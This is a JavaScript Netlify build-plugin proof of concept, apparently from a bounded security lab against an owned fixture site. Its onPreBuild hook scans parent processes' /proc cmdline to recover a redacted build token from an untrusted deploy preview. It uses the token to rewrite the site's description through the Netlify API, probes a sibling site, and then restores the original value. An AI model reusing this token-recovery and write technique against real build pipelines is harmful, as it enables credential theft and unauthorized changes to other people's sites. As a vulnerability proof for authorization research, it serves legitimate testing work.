// Generated for one bounded run against the explicitly owned fixture.
import { readFileSync } from 'node:fs'

const EXPECTED = {"runId":"site-settings-authz-20261002-71afd1ab1c62fc18","siteId":"43a2f4e4-df31-455e-85bc-21f37fae92cd","siteName":"netlify-untrusted-preview-lab","repository":"Jhounx/netlify-untrusted-preview-lab","reviewId":"1","head":"bot/untrusted-preview-probe-36495196637","siblingSiteId":"a13832a0-b3f7-40cb-a07f-df10e6929241","baselineDescription":"","marker":"netlify-owned-site-settings-71afd1ab1c62fc18"}
const SUCCESS = "NETLIFY_UNTRUSTED_SITE_UPDATE_AUTHZ "
const FAILURE = "NETLIFY_UNTRUSTED_SITE_UPDATE_AUTHZ_FAILED "
const API = 'https://api.netlify.com'

const safeFailure = (code, status = null) => ({ code, status })

const procText = (pid, name) => {
  try { return readFileSync(`/proc/${pid}/${name}`, 'utf8') } catch { return '' }
}

const parentPid = (pid) => {
  const match = procText(pid, 'status').match(/^PPid:\s+(\d+)$/m)
  return match ? Number(match[1]) : 0
}

const optionValue = (argv, option) => {
  for (let index = 0; index < argv.length; index += 1) {
    if (argv[index] === option && index + 1 < argv.length) return argv[index + 1]
    if (argv[index].startsWith(`${option}=`)) return argv[index].slice(option.length + 1)
  }
  return ''
}

const recoverToken = () => {
  let pid = process.pid
  for (let depth = 0; depth < 12 && pid > 0; depth += 1) {
    const argv = procText(pid, 'cmdline').split('\0').filter(Boolean)
    const token = optionValue(argv, '--token')
    if (token) {
      return { token, netlifyBuildAncestor: argv.some((item) => /(?:@netlify\/build|netlify-build)/i.test(item)) }
    }
    const next = parentPid(pid)
    if (!next || next === pid) break
    pid = next
  }
  return { token: '', netlifyBuildAncestor: false }
}

const request = async (path, token, options = {}) => {
  const headers = { Accept: 'application/json', ...(options.headers || {}) }
  if (token) headers.Authorization = `Bearer ${token}`
  const response = await fetch(`${API}${path}`, { ...options, headers, redirect: 'manual' })
  let body = null
  try { body = await response.json() } catch { /* status is sufficient */ }
  return { status: response.status, body }
}

const patchDescription = (siteId, token, description) => request(`/api/v1/sites/${siteId}`, token, {
  method: 'PATCH',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ description }),
})

export const onPreBuild = async () => {
  let token = ''
  let mutationObserved = false
  let failure = null
  let proof = null
  let restoreStatus = null
  let restoreMatched = false

  try {
    if (process.env.NETLIFY !== 'true' || process.env.CONTEXT !== 'deploy-preview') throw safeFailure('HOSTED_CONTEXT')
    if (process.env.SITE_ID !== EXPECTED.siteId) throw safeFailure('SITE_ID')
    if (process.env.REVIEW_ID !== EXPECTED.reviewId) throw safeFailure('REVIEW_ID')
    if (process.env.HEAD !== EXPECTED.head) throw safeFailure('HEAD')
    if (!/^[0-9a-f]{40}$/.test(process.env.COMMIT_REF || '')) throw safeFailure('COMMIT_REF')
    if (process.env.NETLIFY_API_TOKEN) throw safeFailure('CHILD_TOKEN_PRESENT')

    const recovered = recoverToken()
    token = recovered.token
    if (!token || !recovered.netlifyBuildAncestor) throw safeFailure('BUILD_TOKEN_NOT_RECOVERED')

    const site = await request(`/api/v1/sites/${EXPECTED.siteId}`, token)
    if (site.status !== 200 || site.body?.id !== EXPECTED.siteId || site.body?.name !== EXPECTED.siteName ||
        site.body?.build_settings?.repo_path !== EXPECTED.repository ||
        site.body?.build_settings?.public_repo !== true ||
        site.body?.build_settings?.untrusted_flow !== 'redact' ||
        site.body?.description !== EXPECTED.baselineDescription) throw safeFailure('SITE_BINDING', site.status)

    const deployId = process.env.DEPLOY_ID || ''
    if (!/^[0-9a-f]{24}$/.test(deployId)) throw safeFailure('DEPLOY_ID')
    const deploy = await request(`/api/v1/deploys/${deployId}`, token)
    if (deploy.status !== 200 || deploy.body?.id !== deployId || deploy.body?.site_id !== EXPECTED.siteId ||
        deploy.body?.context !== 'deploy-preview' || String(deploy.body?.review_id) !== EXPECTED.reviewId ||
        deploy.body?.commit_ref !== process.env.COMMIT_REF) throw safeFailure('DEPLOY_BINDING', deploy.status)

    const sibling = await request(`/api/v1/sites/${EXPECTED.siblingSiteId}`, token)
    const unauthenticated = await patchDescription(EXPECTED.siteId, '', EXPECTED.marker)
    if (![401, 403, 404].includes(unauthenticated.status)) throw safeFailure('UNAUTHENTICATED_CONTROL', unauthenticated.status)

    const write = await patchDescription(EXPECTED.siteId, token, EXPECTED.marker)
    const readback = await request(`/api/v1/sites/${EXPECTED.siteId}`, token)
    mutationObserved = readback.status === 200 && readback.body?.description === EXPECTED.marker
    const baselineStillPresent = readback.status === 200 && readback.body?.description === EXPECTED.baselineDescription
    if (!mutationObserved && !baselineStillPresent) throw safeFailure('WRITE_STATE_AMBIGUOUS', readback.status)
    if (!mutationObserved && ![401, 403, 404].includes(write.status)) throw safeFailure('WRITE_STATUS_AMBIGUOUS', write.status)

    proof = {
      proofSucceeded: true,
      siteBound: true,
      deployBound: true,
      untrustedRedactPolicy: true,
      tokenAbsentFromChildEnvironment: true,
      tokenRecoveredFromNetlifyBuildAncestor: true,
      unauthenticatedControlDenied: true,
      sameSiteWriteStatus: write.status,
      writeResponseMatched: write.body?.description === EXPECTED.marker,
      sameSiteReadbackStatus: readback.status,
      sameSiteReadbackMatched: mutationObserved,
      baselineStillPresentAfterAttempt: baselineStillPresent,
      sameSiteWriteAuthorized: mutationObserved,
      siblingReadStatus: sibling.status,
      siblingReadable: sibling.status === 200,
      rawCredentialsLogged: false,
      rawSiteValuesLogged: false,
    }
  } catch (error) {
    failure = error && typeof error.code === 'string' ? error : safeFailure('UNKNOWN')
  } finally {
    if (mutationObserved && token) {
      try {
        const restored = await patchDescription(EXPECTED.siteId, token, EXPECTED.baselineDescription)
        restoreStatus = restored.status
        const readback = await request(`/api/v1/sites/${EXPECTED.siteId}`, token)
        restoreMatched = readback.status === 200 && readback.body?.description === EXPECTED.baselineDescription
      } catch {
        restoreMatched = false
      }
      if (!restoreMatched) failure = safeFailure('RESTORE', restoreStatus)
    } else {
      restoreMatched = true
    }
  }

  if (failure || !proof) {
    console.error(FAILURE + JSON.stringify({ code: failure?.code || 'UNKNOWN', status: failure?.status ?? null, restoreMatched }))
    return
  }
  console.log(SUCCESS + JSON.stringify({ ...proof, restoreStatus, restoreMatched }))
}
